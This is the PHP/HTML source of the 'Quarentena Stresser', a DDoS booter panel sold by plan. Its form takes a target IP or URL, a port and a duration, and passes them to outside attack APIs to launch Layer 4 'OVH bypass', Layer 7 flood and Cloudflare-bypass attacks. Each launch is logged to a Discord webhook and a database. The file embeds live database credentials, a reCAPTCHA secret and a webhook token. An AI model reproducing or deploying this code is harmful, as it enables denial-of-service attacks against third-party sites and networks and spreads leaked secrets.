
<?php
    error_reporting(0);
    date_default_timezone_set('Europe/Lisbon');

    try {
        $dbh = new PDO("mysql:host=213.32.57.100;dbname=kingsma1_quarentena", "kingsma1_quarentena", "NxXkUmGYpbPh");
        $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    } catch (PDOException $e) {
        echo 'Connection failed: ' . $e->getMessage();
    }
    
    session_start();

    $allowedIps = ['89.155.87.236'];
    $userIp = $_SERVER['REMOTE_ADDR'];
    
    if (!in_array($userIp, $allowedIps)) {
        exit('Unauthorized IP. You need to buy a plan. Contact by discord ->TheHike#3377');
    }

    function exists(){
        global $dbh;

        $stmt = $dbh->prepare("SELECT * FROM logs WHERE id=(SELECT max(id) FROM logs)");
        $stmt->execute();

        return $stmt->fetch();

    }

?>
  <!doctype html>
<html lang="en" >

<head>

        <meta charset="utf-8" />
        <title>Quarentena Stresser</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="We are the best free stresser/booter on internet. We don't collect logs and we have a high power.">
        <meta name="keywords" content="free stresser, free booter, web stresser, web booter, stresser, booter, ip stresser, best stresser, stressthem, instant-stresser">
        <meta content="Quarentena" name="author" />

        <meta property="og:type" content="website">
        <meta property="og:url" content="index.php">

        <meta property="twitter:url" content="index.php">

        <link rel="shortcut icon" href="assets/images/favicon.ico">
        <link href="assets/css/bootstrap-dark.min.css" id="bootstrap-style" rel="stylesheet" type="text/css" />
        <link href="assets/css/icons.min.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/app-dark.min.css" id="app-style" rel="stylesheet" type="text/css" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

        <script>
            $(document).ready(function(){
                $("#layer4").click(function() {
                    $("#method").attr("value", "layer4")
                    $("#title").text("Launch an Attack with Layer 4.")
                    $("#ip_label").text("IP Address")
                    $("#ip_input").attr("placeholder", "127.0.0.1")
                    $("#port_input").attr("value", "")
                    $("#port_div").show()
                });

                $("#layer7").click(function() {
                    $("#method").attr("value", "layer7")
                    $("#title").text("Launch an Attack with Layer 7.")
                    $("#ip_label").text("Website URL")
                    $("#ip_input").attr("placeholder", "https://www.google.com")
                    $("#port_input").attr("value", "0")
                    $("#port_div").hide()
                });

                $("#layer7-bypass").click(function() {
                    $("#method").attr("value", "layer7-bypass")
                    $("#title").text("Launch an Attack with Layer 7.")
                    $("#ip_label").text("Website URL")
                    $("#ip_input").attr("placeholder", "https://www.google.com")
                    $("#port_input").attr("value", "0")
                    $("#port_div").hide()
                });
            });

        </script>

    </head>

    <body data-topbar="dark" data-layout="horizontal">

        <!-- Begin page -->
        <div id="layout-wrapper">

					<header id="page-topbar">
							<div class="navbar-header">
									<div class="d-flex">
											<!-- LOGO -->
											<div class="navbar-brand-box">
													<a href="index.php" class="logo logo-dark">
															<span class="logo-sm">
                                                                <b>teste</b>
															</span>
															<span class="logo-lg">
                                                            <b>teste</b>
															</span>
													</a>

													<a href="index.php" class="logo logo-light">
                                                    <span class="logo-sm">
                                                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Radioactive.svg/1200px-Radioactive.svg.png" width="50" height="50">
															</span>
															<span class="logo-lg">
                                                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Radioactive.svg/1200px-Radioactive.svg.png" width="50" height="50">
															</span>
													</a>
											</div>


									</div>

									<div class="d-flex">

                                    <div class="dropdown d-inline-block">
													<button type="button" onclick="window.location.href='vip.php'" class="btn header-item noti-icon waves-effect"
															data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
															<i class="mdi mdi-diamond-stone"></i>
													</button>
											</div>
										<div class="dropdown d-inline-block">
												<button type="button" onclick="window.location.href='about.php'" class="btn header-item noti-icon waves-effect"
														data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
														<i class="mdi mdi-order-bool-descending"></i>
												</button>
										</div>											<div class="dropdown d-inline-block">
													<button type="button" onclick="window.location.href='contact.php'" class="btn header-item noti-icon waves-effect"
															data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
															<i class="mdi mdi-email"></i>
													</button>
											</div>
											<div class="dropdown d-inline-block">
													<button type="button" onclick="window.location.href='tos.php'" class="btn header-item noti-icon waves-effect"
															data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
															<i class="mdi mdi-book"></i>
													</button>
											</div>
									</div>
							</div>
                    </header>
                    
            <!-- ============================================================== -->
            <!-- Start right Content here -->
            <!-- ============================================================== -->
            <div class="main-content">

                <div class="page-content">
                    <div class="container-fluid">

                        <div class="row" id="gay">
                            <div class="col-lg-12">
                                <div class="card">
                                    <div class="card-body" style="text-align: center">
                                        <div class="btn-group" role="group" aria-label="Basic example">
                                            <button type="button" id="layer4" class="btn btn-secondary">LAYER4-OVHBYPASS</button>
                                            <button type="button" id="layer7" class="btn btn-secondary">LAYER7-FLOOD</button>
                                            <button type="button" id="layer7-bypass" class="btn btn-secondary">LAYER7-CFBYPASS</button>
                                        </div>
                                      </div>
                                    <div class="card-body">
                                        <h4 class="card-title mb-4" id="title">Launch an Attack with Layer 4.</h4>

                                        <form method="POST">
                                            <?php

                                                if(isset($_POST["g-recaptcha-response"]) && is_numeric($_POST["port"]) && is_numeric($_POST["time"]) && filter_var($ip, FILTER_VALIDATE_IP)) {
                                                    
                                                    if($_POST["time"] > 100 || $_POST["time"] <= 0) {
                                                        echo '<script>alert("Time should be a number between 1 and 100.");</script>';
                                                    } else {

                                                        $secretKey = "6Lc_MdAZAAAAACIGNKJGewWY-Wl3BMVaV6QoY-U5";
                                                        $captcha = $_POST['g-recaptcha-response'];
                                                        $serverIp = $_SERVER['REMOTE_ADDR'];

                                                        $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) .  '&response=' . urlencode($captcha);
                                                        $response = file_get_contents($url);
                                                        $responseKeys = json_decode($response, true);

                                                        if($responseKeys["success"]) {

                                                            $mysql_content = exists();
                                                            $actual_date = date('Y-m-d H:i:s');    

                                                            if((strtotime($actual_date) - strtotime($mysql_content["timestamp"])) < intval($mysql_content["time"])) {
                                                                echo '<script>alert("Sorry, an attack is already running.");</script>';
                                                            } else {

                                                                echo '<div class="alert alert-success">';

                                                                $ip = $_POST['ip'];
                                                                $port = $_POST['port'];
                                                                $time = $_POST['time'];

                                                    

                                                                if($_POST["method"] == "layer4"){

                                                                    $api = "http://165.22.199.179/api.php?key=wowepico&host=" . $ip . "&port=" . $port . "&time=" . $time . "&method=layer4";
                                                            
                                                                    $curl = curl_init($api);
                                                                    curl_setopt($curl, CURLOPT_URL, $api);
                                                                    curl_exec($curl);
                                                                    curl_close($curl);

                                                                    echo '<script>$("#send_btn").text("Attacking... Please wait.")</script>';

                                                                    $webhookurl = "https://discordapp.com/api/webhooks/759880523878891542/0o7qJTRreSeQ-Y8CBETN6VTs6bOqGddsGjx0Yvgm5xYinxw_VKJG2gamvHLD416SoYHr";
                                                                
                                                                    $timestamp = date("c", strtotime("now"));
                                                                    
                                                                    $json_data = json_encode([
                                                                        
                                                                        // Username
                                                                        "username" => "Quarentena.club",
    
                                                                        "tts" => false,
                                                                    
                                                                        "embeds" => [
                                                                            [
                                                                                // Embed Title
                                                                                "title" => "LOGS",
                                                                    
                                                                                // Embed Type
                                                                                "type" => "rich",
                                                                    
                                                                                // Embed Description
                                                                                "description" => "Attack has been sent to " .$ip. " for " .$time. " seconds with Method **LAYER4** | Server: Alpha",
                                                                                                                                  
                                                                    
                                                                                // Timestamp of embed must be formatted as ISO8601
                                                                                "timestamp" => $timestamp,
                                                                    
                                                                                // Embed left border color in HEX
                                                                                "color" => hexdec( "3366ff" ),                                                   
                                                                    
                                                                                // Author
                                                                                "author" => [
                                                                                    "name" => "Quarentena.club",
                                                                                    "url" => "https://quarentena.club"
                                                                                ],
                                                                    
                                                                            ]
                                                                        ]
                                                                    
                                                                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
                                                                    
                                                                    
                                                                    $ch = curl_init( $webhookurl );
                                                                    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                                                    curl_setopt( $ch, CURLOPT_POST, 1);
                                                                    curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
                                                                    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt( $ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    
                                                                    $response = curl_exec( $ch );
                                                                    curl_close( $ch );
                                                                    
                                                                    
    

        
                                                                } else if($_POST["method"] == "layer7") {

                                                                    $api = "https://api.invalid.pw/v1/attack.php?key=Yh4eetgCSg&uid=795&target=" . $ip . "&port=80&duration=" . $time . "&method=httpnull&vip=1";
                                                                    //[HOST]&port=[PORT]&duration=[TIME]&method=[METHOD]&vip=0
                                                            
                                                                    $curl = curl_init($api);
                                                                    curl_setopt($curl, CURLOPT_URL, $api);
                                                                    curl_setopt($curl, CURLOPT_HEADER, 0);
                                                                    curl_setopt($curl, CURLOPT_NOSIGNAL, 1);
                                                                    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                                                                    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt($curl, CURLOPT_TIMEOUT, 4);
                                                                    curl_exec($curl);
                                                                    curl_close($curl);

                                                                    echo '<script>$("#send_btn").text("Attacking... Please wait.")</script>';

                                                                    $webhookurl = "https://discordapp.com/api/webhooks/759880523878891542/0o7qJTRreSeQ-Y8CBETN6VTs6bOqGddsGjx0Yvgm5xYinxw_VKJG2gamvHLD416SoYHr";
                                                                
                                                                    $timestamp = date("c", strtotime("now"));
                                                                    
                                                                    $json_data = json_encode([
                                                                        
                                                                        // Username
                                                                        "username" => "Quarentena.club",
    
                                                                        "tts" => false,
                                                                    
                                                                        "embeds" => [
                                                                            [
                                                                                // Embed Title
                                                                                "title" => "LOGS",
                                                                    
                                                                                // Embed Type
                                                                                "type" => "rich",
                                                                    
                                                                                // Embed Description
                                                                                "description" => "Attack has been sent to " .$ip. " for " .$time. " seconds with Method **LAYER7** | Server: Alpha",
                                                                                                                                  
                                                                    
                                                                                "timestamp" => $timestamp,
                                                                    
                                                                                "color" => hexdec( "3366ff" ),                                                   
                                                                    
                                                                                "author" => [
                                                                                    "name" => "Quarentena.club",
                                                                                    "url" => "https://quarentena.club"
                                                                                ],
                                                                    
                                                                            ]
                                                                        ]
                                                                    
                                                                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
                                                                    
                                                                    
                                                                    $ch = curl_init( $webhookurl );
                                                                    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                                                    curl_setopt( $ch, CURLOPT_POST, 1);
                                                                    curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
                                                                    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt( $ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    
                                                                    $response = curl_exec( $ch );
                                                                    curl_close( $ch );
                                                                    
                                                                    
    

                                                                }
                                                                else if($_POST["method"] == "layer7-bypass")
                                                                {
                                                                    $api = "http://165.22.199.179/api.php?key=wowepico&host=" . $ip . "&time=" . $time . "&method=layer7";
                                                            
                                                                    $curl = curl_init($api);
                                                                    curl_setopt($curl, CURLOPT_URL, $api);
                                                                    curl_exec($curl);
                                                                    curl_close($curl);

                                                                    echo '<script>$("#send_btn").text("Attacking... Please wait.")</script>';

                                                                    $webhookurl = "https://discordapp.com/api/webhooks/759880523878891542/0o7qJTRreSeQ-Y8CBETN6VTs6bOqGddsGjx0Yvgm5xYinxw_VKJG2gamvHLD416SoYHr";
                                                                
                                                                    $timestamp = date("c", strtotime("now"));
                                                                    
                                                                    $json_data = json_encode([
                                                                        
                                                                        // Username
                                                                        "username" => "Quarentena.club",
    
                                                                        "tts" => false,
                                                                    
                                                                        "embeds" => [
                                                                            [
                                                                                // Embed Title
                                                                                "title" => "LOGS",
                                                                    
                                                                                // Embed Type
                                                                                "type" => "rich",
                                                                    
                                                                                // Embed Description
                                                                                "description" => "Attack has been sent to " .$ip. " for " .$time. " seconds with Method **LAYER7** | Server: Alpha",
                                                                                                                                  
                                                                    
                                                                                // Timestamp of embed must be formatted as ISO8601
                                                                                "timestamp" => $timestamp,
                                                                    
                                                                                // Embed left border color in HEX
                                                                                "color" => hexdec( "3366ff" ),                                                   
                                                                    
                                                                                // Author
                                                                                "author" => [
                                                                                    "name" => "Quarentena.club",
                                                                                    "url" => "https://quarentena.club"
                                                                                ],
                                                                    
                                                                            ]
                                                                        ]
                                                                    
                                                                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
                                                                    
                                                                    
                                                                    $ch = curl_init( $webhookurl );
                                                                    curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                                                    curl_setopt( $ch, CURLOPT_POST, 1);
                                                                    curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
                                                                    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
                                                                    curl_setopt( $ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    
                                                                    $response = curl_exec( $ch );
                                                                    curl_close( $ch );    
                                                                }
                                                                

                                                                echo '</div>';

                                                                $stmt = $dbh->prepare("INSERT INTO logs (ip, port, method, time) VALUES (?, ?, ?, ?)");
                                                                $stmt->bindParam(1, $ip, \PDO::PARAM_STR);
                                                                $stmt->bindParam(2, $port, \PDO::PARAM_STR);
                                                                $stmt->bindParam(3, $_POST["method"], \PDO::PARAM_STR);
                                                                $stmt->bindParam(4, $time, \PDO::PARAM_STR);
                                                                $stmt->execute();

                                                            }
                                                        }
                                                    }
                                                }

                                            ?>

                                            <input type="hidden" name="method" value="layer4" id="method" class="form-control" >

                                            <div class="form-group">
                                                <label for="formrow-firstname-input" id="ip_label">IP Address</label>
                                                <input type="text" name="ip" id="ip_input" placeholder="127.0.0.1" class="form-control" required>
                                            </div>
                                            <div class="row">
                                                <div class="col-md-6" id="port_div">
                                                    <div class="form-group">
                                                        <label for="formrow-email-input">Port</label>
                                                        <input type="text" name="port" id="port_input" placeholder="80" class="form-control" required>
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label for="formrow-password-input">Time</label>
                                                        <input type="text" name="time" placeholder="120" class="form-control" required>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="row">
                                                <div class="col-lg-10">
                                                    <div class="form-group">
                                                        <label for="formrow-inputCity">Captcha</label>
                                                        <div class="g-recaptcha" data-sitekey="6Lc_MdAZAAAAAHpoEC3jnhPjd3C66bC0TPlVdjl1"></div>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="form-group" align="center">

                                                <div class="custom-control custom-checkbox">
                                                    <input type="checkbox" name="tos" class="custom-control-input" id="formrow-customCheck" required>
                                                    <label class="custom-control-label" for="formrow-customCheck" >You will have to agree to TOS.</label>
                                                </div>
                                            </div>
                                            <div align="center">
                                              <button type="submit" name="attack" id="send_btn" class="btn btn-info waves-effect waves-light">Attack</button>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- end row -->
                    </div> <!-- container-fluid -->
                </div>
                <!-- End Page-content -->

                <footer class="footer">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-sm-6">
                                <script>document.write(new Date().getFullYear())</script> © Hike & Samurai.
                            </div>
                            <div class="col-sm-6">
                                <div class="text-sm-right d-none d-sm-block">
                                    Fuck design, all my homies hate designers , pasted frontend
                                </div>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
            <!-- end main content-->

        </div>
        <!-- END layout-wrapper -->

        <!-- JAVASCRIPT -->
        <script src="assets/libs/jquery/jquery.min.js"></script>
        <script src="assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
        <script src="assets/libs/metismenu/metisMenu.min.js"></script>
        <script src="assets/libs/simplebar/simplebar.min.js"></script>
        <script src="assets/libs/node-waves/waves.min.js"></script>
        <script src="assets/js/app.js"></script>
        <script src='https://www.google.com/recaptcha/api.js' async defer></script>
        <script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>

        <script src="/dfp.min.js" type="text/javascript"></script>

    </body>
</html>


